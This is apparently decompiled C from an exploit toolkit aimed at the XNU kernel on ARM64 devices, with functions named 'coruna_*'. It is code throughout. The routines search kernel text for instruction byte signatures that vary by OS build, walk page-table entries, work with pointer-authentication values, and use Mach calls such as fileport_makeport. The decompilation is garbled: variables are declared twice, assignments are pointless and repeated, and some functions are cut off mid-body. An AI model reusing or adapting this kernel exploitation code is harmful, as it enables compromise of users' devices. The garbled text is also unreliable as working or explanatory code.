        handle = handle + -1;
        port = u;
      } while (1 < handle);
    }
    path_buf = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_cat(err,coruna_cat(
                                                  err,coruna_cat(err,err))))))));
    cache_22 = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_cat(err,coruna_cat(
                                                  err,coruna_cat(err,err))))))));
    cache_24 = cache_22;
    cache_23 = path_buf;
    cache = cache_22;
    sa_new = path_buf;
    cache_21 = cache_22;
    cache_20 = path_buf;
    json_buf = cache_22;
    sa_saved = path_buf;
    work = cache_22;
    frame = path_buf;
    region = cache_22;
    stack_guard = path_buf;
    url_buf = cache_22;
    plist = path_buf;
    sa_new = cache_22;
    block_ctx = path_buf;
    tmp_buf = cache_22;
    path_buf = path_buf;
    block_ctx = cache_22;
    action = path_buf;
    sa_saved = cache_22;
    stack_guard = path_buf;
    host_info = cache_22;
    serial_buf = path_buf;
    action = cache_22;
    serial_buf = path_buf;
    scratch = cache_22;
    host_info = path_buf;
    thread_attr = cache_22;
    bootargs = path_buf;
    if (1 < err) {
      err = 0;
      do {
        handle = (long)*(short *)(addr_2 + (long)(char)err * 2);
        status = ~err + err;
        if (handle == -1) {
          path_buf = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_cat(status
                                                  ,coruna_cat(status,coruna_cat(status,status))))))));
          cache_22 = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_cat(
                                                  status,coruna_cat(status,coruna_cat(status,status))))))
                                              ));
          cache_24 = cache_22;
          cache_23 = path_buf;
          cache = cache_22;
          sa_new = path_buf;
          cache_21 = cache_22;
          cache_20 = path_buf;
          json_buf = cache_22;
          sa_saved = path_buf;
          work = cache_22;
          frame = path_buf;
          region = cache_22;
          stack_guard = path_buf;
          url_buf = cache_22;
          plist = path_buf;
          sa_new = cache_22;
          block_ctx = path_buf;
          tmp_buf = cache_22;
          path_buf = path_buf;
          block_ctx = cache_22;
          action = path_buf;
          sa_saved = cache_22;
          stack_guard = path_buf;
          host_info = cache_22;
          serial_buf = path_buf;
          action = cache_22;
          serial_buf = path_buf;
          scratch = cache_22;
          host_info = path_buf;
          thread_attr = cache_22;
          bootargs = path_buf;
        }
        else {
          *(char *)((long)&host_info + handle) = status;
        }
        err = err + 1;
      } while ((int)(char)err < err + -1);
    }
    lps14 = (short *)(addr_2 + port * 2 + -2);
    handle = (long)*lps14;
    err = *(char *)((long)&host_info + handle);
    *(uint8_t *)((long)&host_info + handle) = 0;
    bootargs = handle[1];
    scratch = *handle;
    thread_attr = handle[2];
    port = coruna_kernel5_residual_226(&scratch,1);
    handle = port;
    buf = (byte *)0x0;
    if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
    }
    return;
  }
done:
  buf = (byte *)0x0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_cat(uint64_t *val,char *path,uint64_t id_2,unsigned long arg)
{
  long handle;
  bool err;
  size_t ls3;
  uint16_t *ptr;
  unsigned long u;
  unsigned long size;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  ls3 = _strlen(path);
  ptr = _malloc((ls3 + 2) * 2);
  if (ptr != (uint16_t *)0x0) {
    ptr[ls3 + 1] = 0;
    *ptr = 0;
    if (ls3 != 0) {
      u = 0;
      size = 1;
      do {
        ptr[size] = (ushort)(byte)path[u];
        err = size < ls3;
        u = size;
        size = (unsigned long)((int)size + 1);
      } while (err);
    }
    err = (arg & 0x20) != 0;
    handle = ls3 + 1;
    if (err) {
      handle = ls3 + 2;
    }
    scratch = val[1];
    scratch = *val;
    bootargs = val[2];
    coruna_kernel5_via_cat(&scratch,ptr + (((uint)arg & 0x20) >> 5 ^ 1),handle,err,id_2,arg);
    _free(ptr);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4(long *handle,uint64_t val,int flags)
{
  unsigned long u;
  int err;
  unsigned long size;
  void *ptr;
  unsigned long version;
  uint8_t version[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t scratch;
  
  bootargs = handle[1];
  scratch = *handle;
  thread_attr = handle[2];
  scratch = val;
  version = coruna_kernel5_residual_226(&scratch,1);
  version = version;
  if ((version != 0) && (version != 0)) {
    u = version + version;
    size = (unsigned long)*(byte *)(*handle + 0x34);
    if (version + size <= u) {
      do {
        ptr = version;
        if ((flags == 0) || ((version & (long)(flags + -1)) == 0)) {
          coruna_kernel5_via_kernel5_via_pacia_4(*handle,ptr,size,version);
          err = _memcmp(ptr,&scratch,size);
          if (err == 0) {
            return;
          }
        }
        version = version + 1;
        version = version + -1;
        version = (long)ptr + 1;
      } while ((long)ptr + 1 + size <= u);
    }
  }
  return;
}
void coruna_macho_cstring(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  
  coruna_macho_map_segsect(bootargs,handle,"__TEXT","__cstring");
  handle = coruna_kernel5_via_kernel5_via_cat(bootargs,size_3,0,0x21);
  if (handle != 0) {
    coruna_macho_map_segsect(scratch,handle,val,id_2);
    coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4(scratch,handle,*(uint8_t *)(handle + 0x34),1);
  }
  return;
}
void coruna_kernel5_str_01_8b_88_d0_38_d5_e8_00_00_b5(long handle)
{
  char *ptr;
  char *buf;
  int err;
  uint u;
  long handle;
  long addr;
  unsigned long size;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  uint8_t thread_attr[24];
  
  err = coruna_pacia_12(*(uint64_t *)(handle + 0x118),8);
  if (err == 0) {
    if ((*(unsigned long *)(handle + 0x88) < 0x22581401900000) ||
       (err = coruna_pacia_12(*(uint64_t *)(handle + 0x118),0x2000), err != 0)) {
      u = coruna_kernel5_residual_229(handle);
      coruna_macho_text_sect(scratch,handle);
      ptr = ".. 01 .. 8B 88 D0 38 D5 E8 00 00 B5";
      if (u != 1) {
        ptr = (char *)0x0;
      }
      buf = "6B FD 62 D3 7F 19 00 F1 .. .. .. 54";
      if (u < 2) {
        buf = ptr;
      }
      ptr = ".. FD .. D3 .. .. 00 F1 .. .. .. 54";
      if (u < 5) {
        ptr = buf;
      }
      addr = coruna_strsep(scratch,ptr,0,1);
      handle = 0xc;
      if (u < 2) {
        handle = -8;
      }
      if (addr == 0) {
        return;
      }
      size = addr + handle;
    }
    else {
      coruna_macho_text_sect(bootargs,handle);
      handle = coruna_strsep(bootargs,".. FD .. D3 .. 00 00 B5",0,1);
      if (handle == 0) {
        return;
      }
      size = handle + 8;
    }
  }
  else {
    coruna_macho_text_sect(thread_attr,handle);
    handle = coruna_strsep(thread_attr,"08 FD 64 D3 1F 21 00 F1 .. 00 00 54",0,1);
    if (handle == 0) {
      return;
    }
    size = handle + 0xc;
  }
  coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2_2(handle,size & 0xfffffffffffffffc,1);
  return;
}
void coruna_kernel5_residual_229(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x70);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      return;
    }
    if (err == 0x1809) {
      return;
    }
    if (err == 0x1c1b) {
      return;
    }
  }
  else {
    if (err == 0x2258 || err == 0x225c) {
      return;
    }
    if (err == 0x2712) {
      return;
    }
  }
  return;
}
void coruna_ret_stub_3(uint64_t val,unsigned long arg)
{
  coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2_2(val,arg & 0xfffffffffffffffc,1);
  return;
}
void coruna_find_mod_init(uint64_t val)
{
  char *ptr;
  char *buf;
  uint u;
  unsigned long size;
  long handle;
  uint64_t scratch;
  unsigned long scratch;
  long bootargs;
  uint8_t thread_attr[8];
  long host_info;
  long serial_buf;
  uint64_t action;
  unsigned long bootargs;
  long block_ctx;
  
  u = coruna_kernel5_residual_229();
  coruna_macho_text_sect(&action,val);
  coruna_macho_map_segsect(thread_attr,val,"__DATA_CONST","__mod_init_func");
  if ((((host_info != 0 && serial_buf != 0) && (size = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_3(val), size != 0)) &&
      (bootargs < size)) && (size < block_ctx + bootargs)) {
    block_ctx = (bootargs - size) + block_ctx;
    bootargs = size;
  }
  ptr = "68 72 40 B9 08 01 19 32 68 72 00 B9";
  if (u != 1) {
    ptr = (char *)0x0;
  }
  buf = "68 82 40 B9 08 01 19 32 68 82 00 B9";
  if (u < 2) {
    buf = ptr;
  }
  scratch = bootargs;
  scratch = action;
  bootargs = block_ctx;
  handle = coruna_strsep(&scratch,buf,0,1);
  if ((handle != 0) &&
     (handle = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2_2(val,handle + 0xcU & 0xfffffffffffffffc,1), handle != 0)) {
    coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_3(val,handle);
  }
  return;
}
void coruna_kernel5_str_e0_03_15_aa_fe_03_13_aa(uint64_t val)
{
  uint u;
  long handle;
  unsigned long size;
  unsigned long version;
  uint8_t scratch[24];
  
  coruna_macho_text_sect(scratch);
  handle = coruna_strsep(scratch,"E0 03 15 AA .. .. .. .. FE 03 13 AA",0,1);
  if ((handle != 0) && (handle = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2(val,handle + 4), handle != 0)) {
    version = 0xfffffffffffffffc;
    do {
      u = coruna_kernel5_via_kernel5_via_pacia_4_2(val,handle + version + 4);
      if (((u & 0x9f000000) == 0x90000000) &&
         (size = coruna_kernel5_via_kernel5_via_pacia_4_2(val,handle + version + 0xc),
         ((uint)(size >> 0x15) & 0x7ff) == 0x458)) {
        coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2_2(val,handle + version + 4,1);
        return;
      }
      version = version + 4;
    } while (version < 0xfc);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2(void)
{
  coruna_kernel5_via_kernel5_via_pacia_4_2();
  return;
}
void coruna_ret_stub_4(uint64_t val,uint64_t id_2)
{
  coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2_2(val,id_2,1);
  return;
}
void coruna_kernel5_str_2b_09_40_b9_4b_39_0b_8b(long handle,uint32_t *size)
{
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  uint64_t scratch;
  long bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  long serial_buf;
  long action;
  
  off = *(long *)(handle + 0x118);
  err = coruna_pacia_12(off,0x20);
  if (err == 0) {
    off = coruna_kernel5_str_e0_03_15_aa_fe_03_13_aa(handle);
    if (off == 0) {
      return;
    }
    scratch = 8;
  }
  else {
    coruna_macho_text_sect(&host_info,*(uint64_t *)(&k_kernel_slot_19f8 + off));
    bootargs = serial_buf + action + -0x20000;
    action = 0x20000;
    scratch = host_info;
    thread_attr = 0x20000;
    serial_buf = bootargs;
    handle = coruna_strsep(&scratch,"2B 09 40 B9 4B 39 0B 8B",0,1);
    if (handle == 0) {
      return;
    }
    handle = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2_2(handle,handle + -0x28,1);
    if (handle == 0) {
      return;
    }
    u = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_3(handle,handle + -8);
    addr = coruna_pacia(off,u);
    if (addr == 0) {
      return;
    }
    err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state(off,u,&scratch);
    if (err == 0) {
      return;
    }
    if (0x1f < (int)scratch - 1U) {
      return;
    }
    u = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_3(handle,handle);
    off = coruna_pacia(off,u);
    if (off == 0) {
      return;
    }
  }
  *size = (int)scratch;
  return;
}
void coruna_kernel5_str_09_00_f9_00_00_80_52_e1_03_00_32(long handle,int flags)
{
  long handle;
  char *ptr;
  char *buf;
  uint u;
  long addr;
  uint64_t size;
  uint8_t scratch[24];
  
  if (((flags < 1) && (handle = handle + (long)flags * 8, *(long *)(&k_kernel_slot_1960 + handle) == 0)
      ) && (flags == 0)) {
    size = *(uint64_t *)(&k_kernel_slot_19f8 + handle);
    u = coruna_kernel5_residual_229(size);
    coruna_macho_text_sect(scratch,size);
    ptr = "09 .. 00 F9 E1 03 00 32 00 00 80 52";
    if (u != 1) {
      ptr = (char *)0x0;
    }
    buf = "09 .. 00 F9 00 00 80 52 E1 03 00 32";
    if (u < 2) {
      buf = ptr;
    }
    addr = coruna_strsep(scratch,buf,0,0);
    if ((addr != 0) && (addr = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2(size,addr + 0xc), addr != 0)) {
      *(long *)(&k_kernel_slot_1960 + handle) = addr;
    }
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_2_2(uint64_t val,unsigned long arg,int flags)
{
  unsigned long u;
  uint size;
  int err;
  uint version;
  bool err;
  
  if ((arg & 3) == 0) {
    size = coruna_kernel5_via_kernel5_via_pacia_4_2();
    if (size == 0xd503201f) {
      coruna_kernel5_via_kernel5_via_pacia_4_2(val,arg + 4);
    }
    else if (((size & 0x9f000000) == 0x90000000) ||
            (((size & 0x9f000000) == 0x10000000 &&
             (err = coruna_kernel5_via_kernel5_via_pacia_4_2(val,arg + 4), err == -0x2afcdfe1)))) {
      err = false;
      size = size & 0x1f;
      u = arg + 0x20;
      while( true ) {
        arg = arg + 4;
        version = coruna_kernel5_via_kernel5_via_pacia_4_2(val,arg);
        if (((version & 0x7f000000) == 0x11000000) && (!err)) {
          if ((version >> 5 & 0x1f) == size) {
            if (flags == 0) {
              return;
            }
            if (size != (version & 0x1f)) {
              return;
            }
            err = true;
          }
          else {
            err = false;
          }
        }
        if (((version & 0xbfc00000) == 0xb9400000) && ((version >> 5 & 0x1f) == size)) {
          return;
        }
        if ((((version & 0xffc00000) == 0xb9800000) || ((version & 0xffc00000) == 0x39400000)) &&
           ((version >> 5 & 0x1f) == size)) break;
        if (version == 0xd65f03c0) {
          return;
        }
        if (u < arg) {
          return;
        }
      }
      return;
    }
  }
  return;
}
void coruna_host_kernel_version(char *path,unsigned long arg)
{
  mach_port_t host;
  uint u;
  int err;
  int *err;
  uint *ptr;
  size_t ls5;
  uint64_t scratch;
  size_t bootargs;
  char scratch [512];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  if (800.0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    scratch = k_kernel_rodata_word_434e0;
    bootargs = 0x200;
    err = _sysctl((int *)&scratch,2,scratch,&bootargs,(void *)0x0,0);
    if (err != 0) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
void coruna_parse_xnu_five(uint64_t *val,uint32_t *size,uint32_t *flags_2)
{
  int err;
  char *ptr;
  size_t ls3;
  int *err;
  uint64_t u;
  char *buf;
  uint64_t scratch;
  char scratch [512];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  if (k_kernel_rodata_word_434e8 <= *(double *)k_kernel_dyldversionnumber_slot) {
    ___strlcpy_chk(scratch,k_kernel_kernelversionstring_slot,0x200,0x200);
    ls3 = _strlen(scratch);
    u = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
    }
    ___stack_chk_fail(u);
void coruna_kernel5_via_pacia_15(uint32_t *size)
{
  long handle;
  
  handle = coruna_pacia_15();
  if (handle != 0) {
    *size = *(uint32_t *)(handle + 0x80);
  }
  return;
}
void coruna_kernel5_residual_231(uint size,uint64_t *val)
{
  uint64_t *ptr;
  uint32_t *buf;
  
  if ((3 < size) && (ptr = _calloc(0x10,1), ptr != (uint64_t *)0x0)) {
    buf = _calloc((unsigned long)size,1);
    *ptr = buf;
    if (buf == (uint32_t *)0x0) {
      _free(ptr);
    }
    else {
      *buf = 0xd3;
      *(uint32_t *)(ptr + 1) = 4;
      *(uint *)((long)ptr + 0xc) = size;
      *val = ptr;
    }
  }
  return;
}
void coruna_kernel5_residual_232(long *handle,uint size,uint flags_2,uint64_t *val)
{
  uint u;
  long handle;
  uint size;
  
  if ((flags_2 & 0xff000000) == 0) {
    u = (size & 0x7f000000) - 0x1000000 >> 0x18;
    if (u < 0xc) {
      size = 1 << (unsigned long)(u & 0x1f);
      if ((size & 0xc07) == 0) {
        if ((size & 0x380) == 0) {
          if (u != 3) {
            return;
          }
          u = 0xc;
        }
        else {
          u = flags_2 + 7 & 0xfffffffc;
        }
      }
      else {
        u = 4;
      }
      if (u <= *(int *)((long)handle + 0xc) - *(uint *)(handle + 1)) {
        handle = *handle;
        *(uint *)(handle + (unsigned long)*(uint *)(handle + 1)) = flags_2 | size;
        u = (int)handle[1] + 4;
        *(uint *)(handle + 1) = u;
        size = (size & 0x7f000000) + 0xfc000000 >> 0x18;
        if (size - 4 < 3) {
          size = flags_2 + 3 & 0xfffffffc;
          _memcpy((void *)(handle + (unsigned long)u),val,(unsigned long)flags_2);
        }
        else {
          if (size != 0) {
            return;
          }
          *(uint64_t *)(handle + (unsigned long)u) = *val;
          size = 8;
        }
        *(uint *)(handle + 1) = (int)handle[1] + size;
      }
    }
  }
  return;
}
void coruna_kernel5_residual_233(long *handle,uint64_t *val,uint32_t *size)
{
  uint u;
  void *ptr;
  
  if (((*handle != 0) && (u = *(uint *)(handle + 1), u != 0)) &&
     (*(int *)((long)handle + 0xc) != 0)) {
    ptr = _malloc((unsigned long)u);
    *val = ptr;
    if (ptr != (void *)0x0) {
      _memcpy(ptr,(void *)*handle,(unsigned long)u);
      *size = (int)handle[1];
    }
  }
  return;
}
void coruna_kernel5_residual_234(uint64_t *val)
{
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
  }
  *val = 0;
  val[1] = 0;
  _free(val);
  return;
}
void coruna_kernel5_residual_235(int flags)
{
  int err;
  
  err = _pipe(flags);
  if (err != 0) {
    ___error();
    ___error();
  }
  return;
}
void coruna_kernel5_residual_236(int *flags)
{
  int err;
  uint u;
  ssize_t ls3;
  int *err;
  uint *ptr;
  uint8_t scratch[256];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  do {
    ls3 = _read(*flags,scratch,0x100);
  } while (0 < ls3);
  err = ___error();
  if (*err == 0x23) {
    u = 0;
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
    ___stack_chk_fail(u);
  }
  return;
}
void coruna_kernel5_via_fcntl(uint32_t *size)
{
  int err;
  
  err = coruna_fcntl(*size);
  if (err == 0) {
    coruna_fcntl(size[1]);
  }
  return;
}
void coruna_fcntl(int flags)
{
  int err;
  
  if ((flags != -1) &&
     ((((err = _fcntl(flags,0x49), err == -1 || (err = _fcntl(flags,1), err == -1)) ||
       (err = _fcntl(flags,2), err == -1)) ||
      ((err = _fcntl(flags,3), err == -1 || (err = _fcntl(flags,4), err == -1)))))) {
    ___error();
    ___error();
  }
  return;
}
void coruna_kernel5_residual_237(long handle,void *ctx,size_t len)
{
  ssize_t ls1;
  
  ls1 = _write(*(int *)(handle + 4),ctx,len);
  if (ls1 < 0) {
    ___error();
    ___error();
  }
  return;
}
void coruna_kernel5_residual_238(int *flags,void *ctx,size_t len)
{
  ssize_t ls1;
  
  ls1 = _read(*flags,ctx,len);
  if (ls1 < 0) {
    ___error();
    ___error();
  }
  return;
}
void coruna_kernel5_via_fileport_makeport(long handle,uint64_t val)
{
  int err;
  long handle;
  int scratch;
  uint32_t bootargs;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return;
    }
  }
  else if (1 < err - 0x1f53U && err != 0x2258) {
    return;
  }
  err = coruna_fileport_makeport(val,&bootargs);
  if ((err == 0) && (handle = coruna_kernel5_via_kernel5_via_pacia_5(handle,bootargs), handle != 0)) {
    err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state(handle,handle + 0x14,&scratch);
    if ((err != 0) && (scratch - 1U < 10)) {
      coruna_mach_vm_machine_attribute(handle,handle + 0x14,0xffff);
    }
  }
  return;
}
void coruna_mach_absolute_time(long handle)
{
  uint64_t *ptr;
  unsigned long u;
  uint64_t size;
  long handle;
  
  handle = *(long *)(handle + 0x868);
  size = _mach_absolute_time();
  if (handle != 0) {
    u = 0;
    if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
      u = ((size - *(long *)(handle + 0x868)) * (unsigned long)*(uint *)(handle + 0x25c)) /
              (unsigned long)*(uint *)(handle + 0x260);
    }
    if (u < 0x12a153440) {
      return;
    }
    handle = 0;
    do {
      ptr = (uint64_t *)(handle + 0x5e8 + handle);
      ptr[4] = 0;
      ptr[1] = 0;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      handle = handle + 0x28;
    } while (handle != 0x280);
    size = _mach_absolute_time();
  }
  *(uint64_t *)(handle + 0x868) = size;
  return;
}
void coruna_kernel5_residual_239(uint64_t val)
{
  long handle;
  
  handle = coruna_kernel5_via_kernel5_via_pacia_5_2();
  if (handle != 0) {
    coruna_kernel5_via_pacia_14(val,handle);
  }
  return;
}
void coruna_kernel5_via_pacia_12_6(long handle,unsigned long arg,long *addr_2,uint64_t val)
{
  bool err;
  int err;
  long handle;
  uint32_t u;
  uint8_t size;
  uint version;
  unsigned long port;
  long addr;
  uint64_t tag;
  long off;
  long base;
  uint64_t scratch;
  unsigned long bootargs;
  
  if (addr_2 == (long *)0x0) {
    return;
  }
  addr = 0;
  addr_2[4] = 0;
  addr_2[1] = 0;
  *addr_2 = 0;
  addr_2[3] = 0;
  addr_2[2] = 0;
  do {
    handle = *(long *)(handle + addr + 0x5e8);
    if (handle == 0) break;
    port = *(unsigned long *)(handle + addr + 0x5f0);
    if ((port <= arg) && (arg < port + *(uint *)(handle + addr + 0x5f8))) {
      err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(handle,handle,8,handle + addr + 0x608,val);
      if (err != 0) {
        handle = handle + addr;
        handle = *(long *)(handle + 0x5f0);
        addr = *(long *)(handle + 0x5e8);
        base = *(long *)(handle + 0x600);
        off = *(long *)(handle + 0x5f8);
        addr_2[4] = *(long *)(handle + 0x608);
        addr_2[1] = handle;
        *addr_2 = addr;
        addr_2[3] = base;
        addr_2[2] = off;
        return;
      }
      break;
    }
    addr = addr + 0x28;
  } while (addr != 0x280);
  if (*(long *)(handle + 0x5d0) == 0) {
    addr = coruna_kernel5_residual_239(handle);
    if (addr == 0) {
      return;
    }
    err = coruna_kernel5_residual_257(handle,addr,&bootargs);
    if (err == 0) {
      return;
    }
    err = coruna_kernel5_residual_257(handle,addr + *(int *)(handle + 0x168),&scratch);
    if (err == 0) {
      return;
    }
    u = 0x200;
    if (*(int *)(handle + 0x180) != 0x1000) {
      u = 0x800;
    }
    *(unsigned long *)(handle + 0x5d0) = bootargs;
    *(uint64_t *)(handle + 0x5d8) = scratch;
    *(uint32_t *)(handle + 0x5e0) = u;
    coruna_kernel5_via_kernel5_via_kernel5_via_pacia_5_2_2(handle);
  }
  if ((*(int *)(handle + 0x180) == 0x1000) || (err = coruna_pacia_12(handle,0x8000), err != 0)) {
    handle = *(long *)(handle + 0x5d0);
    tag = *(uint64_t *)(handle + 0x5d8);
    addr = coruna_kernel5_residual_272(handle,handle,tag,tag);
    port = arg >> 0x1b & 0x7f8;
    err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(handle,handle + port,8,&bootargs,val);
    err = false;
    {
      if (err) {
      addr = 0;
      do {
      if (*(long *)(handle + 0x5e8 + addr) == 0) {
      handle = handle + addr;
      handle = addr_2[1];
      addr = *addr_2;
      base = addr_2[3];
      off = addr_2[2];
      *(long *)(handle + 0x608) = addr_2[4];
      *(long *)(handle + 0x5f0) = handle;
      *(long *)(handle + 0x5e8) = addr;
      *(long *)(handle + 0x600) = base;
      *(long *)(handle + 0x5f8) = off;
      return;
      }
      addr = addr + 0x28;
      } while (addr != 0x280);
      }
      return;
    }
    if ((bootargs & 3) != 0) {
      if ((bootargs & 3) == 1) {
        addr = addr + port;
        u = 0x40000000;
        port = 0xffffffffc0000000;
        size = 1;
      }
      else {
        if ((bootargs >> 0x3b & 1) != 0) {
          *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
        }
        addr = coruna_kernel5_residual_272(handle,handle,tag,bootargs & 0xfffffffff000);
        addr = addr + (arg >> 0x12 & 0xff8);
        err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(handle,addr,8,&bootargs,val);
        err = false;
        {
          if (err) {
          addr = 0;
          do {
          if (*(long *)(handle + 0x5e8 + addr) == 0) {
          handle = handle + addr;
          handle = addr_2[1];
          addr = *addr_2;
          base = addr_2[3];
          off = addr_2[2];
          *(long *)(handle + 0x608) = addr_2[4];
          *(long *)(handle + 0x5f0) = handle;
          *(long *)(handle + 0x5e8) = addr;
          *(long *)(handle + 0x600) = base;
          *(long *)(handle + 0x5f8) = off;
          return;
          }
          addr = addr + 0x28;
          } while (addr != 0x280);
          }
          return;
        }
        if ((bootargs & 3) == 0) goto done;
        if ((bootargs & 3) == 1) {
          u = 0x200000;
          port = 0xffffffffffe00000;
          size = 1;
        }
        else {
          if ((bootargs >> 0x3b & 1) != 0) {
            *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
          }
          addr = coruna_kernel5_residual_272(handle,handle,tag,bootargs & 0xfffffffff000);
          addr = addr + (arg >> 9 & 0xff8);
          err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(handle,addr,8,&bootargs,val);
          err = false;
          {
            if (err) {
            addr = 0;
            do {
            if (*(long *)(handle + 0x5e8 + addr) == 0) {
            handle = handle + addr;
            handle = addr_2[1];
            addr = *addr_2;
            base = addr_2[3];
            off = addr_2[2];
            *(long *)(handle + 0x608) = addr_2[4];
            *(long *)(handle + 0x5f0) = handle;
            *(long *)(handle + 0x5e8) = addr;
            *(long *)(handle + 0x600) = base;
            *(long *)(handle + 0x5f8) = off;
            return;
            }
            addr = addr + 0x28;
            } while (addr != 0x280);
            }
            return;
          }
          if ((~(uint)bootargs & 3) != 0) goto done;
          size = 3;
          u = 0x1000;
          port = 0xfffffffffffff000;
        }
      }
      *addr_2 = addr;
cleanup:
      addr_2[1] = port & arg;
      *(uint32_t *)(addr_2 + 2) = u;
      *(uint8_t *)((long)addr_2 + 0x14) = size;
      addr_2[4] = bootargs;
      version = 3;
      if ((bootargs & 0x80) != 0) {
        version = 1;
      }
      *(uint *)(addr_2 + 3) = ((uint)(bootargs >> 0x33) & 4 | version) ^ 4;
      err = true;
      {
        if (err) {
        addr = 0;
        do {
        if (*(long *)(handle + 0x5e8 + addr) == 0) {
        handle = handle + addr;
        handle = addr_2[1];
        addr = *addr_2;
        base = addr_2[3];
        off = addr_2[2];
        *(long *)(handle + 0x608) = addr_2[4];
        *(long *)(handle + 0x5f0) = handle;
        *(long *)(handle + 0x5e8) = addr;
        *(long *)(handle + 0x600) = base;
        *(long *)(handle + 0x5f8) = off;
        return;
        }
        addr = addr + 0x28;
        } while (addr != 0x280);
        }
        return;
      }
    }
  }
  else {
    if (*(int *)(handle + 0x180) != 0x4000) {
      return;
    }
    addr = *(long *)(handle + 0x5d0);
    tag = *(uint64_t *)(handle + 0x5d8);
    err = coruna_pacia_12(handle,0x5000008);
    port = 7;
    if (err != 0) {
      port = 0x7ff;
    }
    err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(handle,addr + (port & arg >> 0x24) * 8,8,&bootargs,val);
    err = false;
    {
      if (err) {
      addr = 0;
      do {
      if (*(long *)(handle + 0x5e8 + addr) == 0) {
      handle = handle + addr;
      handle = addr_2[1];
      addr = *addr_2;
      base = addr_2[3];
      off = addr_2[2];
      *(long *)(handle + 0x608) = addr_2[4];
      *(long *)(handle + 0x5f0) = handle;
      *(long *)(handle + 0x5e8) = addr;
      *(long *)(handle + 0x600) = base;
      *(long *)(handle + 0x5f8) = off;
      return;
      }
      addr = addr + 0x28;
      } while (addr != 0x280);
      }
      return;
    }
    if ((~(uint)bootargs & 3) == 0) {
      if ((bootargs >> 0x3b & 1) != 0) {
        *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
      }
      handle = coruna_kernel5_residual_272(handle,addr,tag,bootargs & 0xffffffffc000);
      handle = handle + (arg >> 0x16 & 0x3ff8);
      err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(handle,handle,8,&bootargs,val);
      err = false;
      {
        if (err) {
        addr = 0;
        do {
        if (*(long *)(handle + 0x5e8 + addr) == 0) {
        handle = handle + addr;
        handle = addr_2[1];
        addr = *addr_2;
        base = addr_2[3];
        off = addr_2[2];
        *(long *)(handle + 0x608) = addr_2[4];
        *(long *)(handle + 0x5f0) = handle;
        *(long *)(handle + 0x5e8) = addr;
        *(long *)(handle + 0x600) = base;
        *(long *)(handle + 0x5f8) = off;
        return;
        }
        addr = addr + 0x28;
        } while (addr != 0x280);
        }
        return;
      }
      if ((bootargs & 3) != 0) {
        if ((bootargs & 3) == 1) {
          u = 0x2000000;
          port = 0xfffffffffe000000;
          size = 1;
        }
        else {
          if ((bootargs >> 0x3b & 1) != 0) {
            *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
          }
